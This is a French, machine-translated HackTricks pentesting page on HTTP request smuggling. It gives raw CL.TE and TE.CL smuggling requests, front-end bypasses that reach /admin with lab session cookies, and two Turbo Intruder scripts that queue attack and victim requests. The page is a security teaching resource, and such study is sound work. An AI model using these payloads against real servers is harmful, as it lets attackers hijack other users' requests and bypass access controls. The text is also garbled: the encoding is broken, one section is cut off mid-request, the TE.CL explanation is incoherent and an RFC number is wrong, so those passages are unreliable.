# HTTP Request Smuggling / Attaque HTTP Desync

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Qu'est-ce que c'est

Cette vulnÃ©rabilitÃ© se produit lorsqu'une **dÃ©synchronisation** entre les **proxys frontaux** et le **serveur back-end** permet Ã  un **attaquant** d'envoyer une **requÃªte HTTP** qui sera **interprÃ©tÃ©e** comme une **seule requÃªte** par les **proxys frontaux** (Ã©quilibrage de charge / proxy inverse) et **comme 2 requÃªtes** par le **serveur back-end**.\
Cela permet Ã  un utilisateur de **modifier la prochaine requÃªte qui arrive sur le serveur back-end aprÃ¨s la sienne**.

### ThÃ©orie

[**SpÃ©cification RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Si un message est reÃ§u avec Ã  la fois un champ d'en-tÃªte Transfer-Encoding et un champ d'en-tÃªte Content-Length, ce dernier DOIT Ãªtre ignorÃ©.

**Content-Length**

> L'en-tÃªte d'entitÃ© Content-Length indique la taille du corps de l'entitÃ©, en octets, envoyÃ© au destinataire.

**Transfer-Encoding: chunked**

> L'en-tÃªte Transfer-Encoding spÃ©cifie la forme de codage utilisÃ©e pour transfÃ©rer en toute sÃ©curitÃ© la charge utile du corps Ã  l'utilisateur.\
> Chunked signifie que de grandes donnÃ©es sont envoyÃ©es sous forme de sÃ©ries de fragments.

### RÃ©alitÃ©

Le **front-end** (un Ã©quilibrage de charge / proxy inverse) **traite** l'en-tÃªte _**content-length**_ ou _**transfer-encoding**_ et le **serveur back-end** **traite l'autre** en provoquant une **dÃ©synchronisation** entre les 2 systÃ¨mes.\
Cela pourrait Ãªtre trÃ¨s critique car **un attaquant pourra envoyer une requÃªte** au proxy inverse qui sera **interprÃ©tÃ©e** par le **serveur back-end comme 2 requÃªtes diffÃ©rentes**. Le **danger** de cette technique rÃ©side dans le fait que le **serveur back-end interprÃ©tera la 2Ã¨me requÃªte injectÃ©e** comme si elle **venait du client suivant** et la **vraie requÃªte** de ce client fera **partie de la requÃªte injectÃ©e**.

### ParticularitÃ©s

Rappelez-vous qu'en HTTP, **un caractÃ¨re de nouvelle ligne est composÃ© de 2 octets** :

* **Content-Length** : Cet en-tÃªte utilise un **nombre dÃ©cimal** pour indiquer le **nombre d'octets** du **corps** de la requÃªte. Le corps est censÃ© se terminer par le dernier caractÃ¨re, **une nouvelle ligne n'est pas nÃ©cessaire Ã  la fin de la requÃªte**.
* **Transfer-Encoding:** Cet en-tÃªte utilise dans le **corps** un **nombre hexadÃ©cimal** pour indiquer le **nombre d'octets** du **prochain fragment**. Le **fragment** doit se **terminer** par une **nouvelle ligne** mais cette nouvelle ligne **n'est pas comptÃ©e** par l'indicateur de longueur. Cette mÃ©thode de transfert doit se terminer par un **fragment de taille 0 suivi de 2 nouvelles lignes** : `0`
* **Connection**: D'aprÃ¨s mon expÃ©rience, il est recommandÃ© d'utiliser **`Connection: keep-alive`** sur la premiÃ¨re requÃªte de la requÃªte Smuggling.

## Exemples de base

Ainsi, les attaques de requÃªte de contrebande impliquent de placer Ã  la fois l'en-tÃªte `Content-Length` et l'en-tÃªte `Transfer-Encoding` dans une seule requÃªte HTTP et de manipuler ces derniers de maniÃ¨re Ã  ce que les serveurs frontal et back-end traitent la requÃªte diffÃ©remment. La maniÃ¨re exacte dont cela est fait dÃ©pend du comportement des deux serveurs :

* **CL.TE** : le serveur frontal utilise l'en-tÃªte `Content-Length` et le serveur back-end utilise l'en-tÃªte `Transfer-Encoding`.
* **TE.CL** : le serveur frontal utilise l'en-tÃªte `Transfer-Encoding` et le serveur back-end utilise l'en-tÃªte `Content-Length`.
* **TE.TE** : les serveurs frontal et back-end prennent tous deux en charge l'en-tÃªte `Transfer-Encoding`, mais l'un des serveurs peut Ãªtre amenÃ© Ã  ne pas le traiter en obscurcissant l'en-tÃªte d'une maniÃ¨re ou d'une autre.

### VulnÃ©rabilitÃ©s CL.TE

Ici, le serveur **frontal** utilise l'en-tÃªte **`Content-Length`** et le serveur **back-end** utilise l'en-tÃªte **`Transfer-Encoding`**. Nous pouvons effectuer une attaque de requÃªte de contrebande HTTP simple comme suit :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

Notez comment `Content-Length` indique que la **longueur des corps de la requÃªte est de 30 octets** (_rappelez-vous que HTTP utilise une nouvelle ligne, donc 2 octets pour chaque nouvelle ligne_), donc le proxy inverse **enverra la requÃªte complÃ¨te** au back-end, et le back-end traitera l'en-tÃªte `Transfer-Encoding`, laissant `GET /404 HTTP/1.1` comme **dÃ©but de la prochaine requÃªte** (au fait, la prochaine requÃªte sera ajoutÃ©e Ã  `Foo:x<La prochaine requÃªte commence ici>`).

### VulnÃ©rabilitÃ©s TE.CL

Ici, le serveur frontal utilise l'en-tÃªte `Transfer-Encoding` et le serveur back-end utilise l'en-tÃªte `Content-Length`. Nous pouvons effectuer une attaque de requÃªte de contrebande HTTP
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
Ã‰tant donnÃ© que le serveur frontal utilise l'en-tÃªte `Content-Length`, il ne transmettra qu'une partie de cette requÃªte, en omettant le `0`. Le serveur arriÃ¨re utilise l'en-tÃªte `Transfer-Encoding`, traite le premier fragment, puis attend l'arrivÃ©e du fragment suivant. Cela entraÃ®nera un retard temporel observable.

Parfois, au lieu d'obtenir une temporisation, vous recevez une erreur 400 bad request de l'hÃ´te final comme dans le scÃ©nario suivant, oÃ¹ une charge utile CL.TE est envoyÃ©e:

![](<../../.gitbook/assets/image (444).png>)

Et la rÃ©ponse est une redirection contenant une erreur dans le corps avec mÃªme la version de haproxy utilisÃ©e:

![](<../../.gitbook/assets/image (443).png>)

### Trouver des vulnÃ©rabilitÃ©s TE.CL en utilisant des techniques de temporisation

Si une application est vulnÃ©rable Ã  la variante TE.CL de la faille de sÃ©curitÃ© de la requÃªte smuggling, alors l'envoi d'une requÃªte comme celle-ci provoquera souvent un retard temporel:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
Ã‰tant donnÃ© que le serveur frontal utilise l'en-tÃªte `Transfer-Encoding`, il ne transmettra qu'une partie de cette requÃªte, en omettant le `X`. Le serveur arriÃ¨re utilise l'en-tÃªte `Content-Length`, attend plus de contenu dans le corps du message et attend que le contenu restant arrive. Cela provoquera un retard temporel observable.

### Exploration des vulnÃ©rabilitÃ©s de la technique de requÃªte HTTP Smuggling

Une fois que vous avez constatÃ© que les **techniques de synchronisation fonctionnent**, vous devez **explorer** si vous pouvez **modifier les requÃªtes d'autres clients**.\
La maniÃ¨re la plus simple de le faire est d'essayer de corrompre vos propres requÃªtes, **faire une demande pour `/` pour renvoyer un code 404 par exemple**.\
Dans les [Exemples de base](./#basic-examples), nous avons dÃ©jÃ  vu des exemples `CL.TE` et `TE.CL` de la maniÃ¨re de corrompre une requÃªte de clients pour demander `/404`, provoquant une rÃ©ponse 404 lorsque le client demandait une autre ressource.

**Notes**

Certaines considÃ©rations importantes doivent Ãªtre gardÃ©es Ã  l'esprit lors de la tentative de confirmation des vulnÃ©rabilitÃ©s de la technique de requÃªte smuggling via l'interfÃ©rence avec d'autres requÃªtes :

* La requÃªte "attaque" et la requÃªte "normale" doivent Ãªtre envoyÃ©es au serveur en utilisant des connexions rÃ©seau diffÃ©rentes. L'envoi des deux requÃªtes via la mÃªme connexion ne prouvera pas que la vulnÃ©rabilitÃ© existe.
* La requÃªte "attaque" et la requÃªte "normale" doivent utiliser la mÃªme URL et les mÃªmes noms de paramÃ¨tres, autant que possible. Cela est dÃ» au fait que de nombreuses applications modernes routent les requÃªtes frontales vers diffÃ©rents serveurs back-end en fonction de l'URL et des paramÃ¨tres. L'utilisation de la mÃªme URL et des mÃªmes paramÃ¨tres augmente la chance que les requÃªtes soient traitÃ©es par le mÃªme serveur back-end, ce qui est essentiel pour que l'attaque fonctionne.
* Lors du test de la requÃªte "normale" pour dÃ©tecter toute interfÃ©rence de la requÃªte "attaque", vous Ãªtes en concurrence avec toutes les autres requÃªtes que l'application reÃ§oit en mÃªme temps, y compris celles des autres utilisateurs. Vous devez envoyer la requÃªte "normale" immÃ©diatement aprÃ¨s la requÃªte "attaque". Si l'application est occupÃ©e, vous devrez peut-Ãªtre effectuer plusieurs tentatives pour confirmer la vulnÃ©rabilitÃ©.
* Dans certaines applications, le serveur frontal fonctionne comme un Ã©quilibreur de charge et transfÃ¨re les requÃªtes vers diffÃ©rents systÃ¨mes back-end selon un algorithme d'Ã©quilibrage de charge. Si vos requÃªtes "attaque" et "normale" sont transfÃ©rÃ©es vers diffÃ©rents systÃ¨mes back-end, l'attaque Ã©chouera. C'est une raison supplÃ©mentaire pour laquelle vous devrez peut-Ãªtre essayer plusieurs fois avant qu'une vulnÃ©rabilitÃ© puisse Ãªtre confirmÃ©e.
* Si votre attaque rÃ©ussit Ã  interfÃ©rer avec une requÃªte ultÃ©rieure, mais que ce n'Ã©tait pas la requÃªte "normale" que vous avez envoyÃ©e pour dÃ©tecter l'interfÃ©rence, cela signifie qu'un autre utilisateur de l'application a Ã©tÃ© affectÃ© par votre attaque. Si vous continuez Ã  effectuer le test, cela pourrait avoir un effet perturbateur sur les autres utilisateurs et vous devriez faire preuve de prudence.

### Forcer via les en-tÃªtes hop-by-hop

En abusant des en-tÃªtes hop-by-hop, vous pouvez indiquer au proxy de **supprimer l'en-tÃªte Content-Length ou Transfer-Encoding pour qu'une requÃªte HTTP smuggling soit possible Ã  exploiter**.
```
Connection: Content-Lentgh
```
Pour **plus d'informations sur les en-tÃªtes hop-by-hop**, visitez :

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Abus de la technique HTTP Request Smuggling

### Pour contourner les contrÃ´les de sÃ©curitÃ© frontaux

Parfois, les **proxys frontaux effectuent des vÃ©rifications de sÃ©curitÃ©**. Vous pouvez les Ã©viter en abusant de la technique HTTP Request Smuggling, car vous pourrez **contourner les protections**. Par exemple, dans cet exemple, vous **ne pouvez pas accÃ©der Ã  `/admin` depuis l'extÃ©rieur** et le proxy frontal vÃ©rifie cela, mais ce **proxy ne vÃ©rifie pas la requÃªte intÃ©grÃ©e** :

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### RÃ©vÃ©ler la rÃ©Ã©criture de requÃªte frontale <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Dans de nombreuses applications, le **serveur frontal effectue une rÃ©Ã©criture des requÃªtes** avant de les transfÃ©rer au serveur back-end, gÃ©nÃ©ralement en ajoutant des en-tÃªtes de requÃªte supplÃ©mentaires.\
Une chose courante Ã  faire est d'**ajouter Ã  la requÃªte l'en-tÃªte** `X-Forwarded-For: <IP du client>` ou un en-tÃªte similaire pour que le back-end connaisse l'IP du client.\
Parfois, si vous pouvez **trouver les nouvelles valeurs qui sont ajoutÃ©es** Ã  la requÃªte, vous pourriez Ãªtre en mesure de **contourner les protections** et d'**accÃ©der Ã  des informations/endpoints cachÃ©s**.

Pour dÃ©couvrir comment le proxy rÃ©Ã©crit la requÃªte, vous devez **trouver un paramÃ¨tre POST dont la valeur sera reflÃ©tÃ©e dans la rÃ©ponse** du back-end. Ensuite, utilisez ce paramÃ¨tre en dernier et utilisez une technique d'exploitation comme celle-ci :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application
### Armes HTTP Request Smuggling avec la dÃ©synchronisation de la rÃ©ponse HTTP

Avez-vous trouvÃ© une vulnÃ©rabilitÃ© de HTTP Request Smuggling et vous ne savez pas comment l'exploiter ? Essayez cette autre mÃ©thode d'exploitation :

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Scripts Turbo Intruder

### CL.TE

Depuis [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )
    engine.start()

    attack = '''POST / HTTP/1.1
 Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

    engine.queue(attack)

    victim = '''GET / HTTP/1.1
Host: xxx.com

'''
    for i in range(14):
        engine.queue(victim)
        time.sleep(0.05)

def handleResponse(req, interesting):
    table.add(req)
```
### TE.CL

Ã€ partir de: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)

---

La technique TE.CL est une technique de contournement de la protection contre les attaques de dÃ©synchronisation HTTP qui consiste Ã  utiliser la mÃ©thode de transfert de codage de transfert de corps de message TE avec une valeur de champ de codage de transfert de derniÃ¨re instance de connexion (CL). Cette technique est utilisÃ©e pour envoyer des requÃªtes HTTP malveillantes qui peuvent Ãªtre utilisÃ©es pour effectuer une prise de contrÃ´le de compte. 

La technique TE.CL est similaire Ã  la technique CL.TE, mais elle utilise la mÃ©thode TE avant la mÃ©thode CL.
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )
    engine.start()

    attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
    engine.queue(attack)

    victim = '''GET / HTTP/1.1
Host: xxx.com

'''
    for i in range(14):
        engine.queue(victim)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)
```
## Plus d'informations

![](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[Image d'ici.](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## Outils

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Cet outil est un Fuzzer HTTP basÃ© sur la grammaire utile pour trouver des anomalies de trafic HTTP.

## RÃ©fÃ©rences

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
